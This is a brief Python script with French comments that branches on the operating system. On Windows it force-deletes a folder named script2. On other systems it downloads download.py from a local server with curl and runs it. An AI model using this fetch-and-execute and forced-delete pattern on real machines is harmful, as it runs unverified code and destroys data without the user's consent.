import os
url = "localhost:8000"
#Vérification de l'os utilisé 
if os.name == "nt":#Il s'agit de Windows
	os.system("rmdir script2 /s /q")
else :

	os.system("curl -o 'download.py' 'http://"+ url + "/download.py'")

	os.system("python3 download.py")
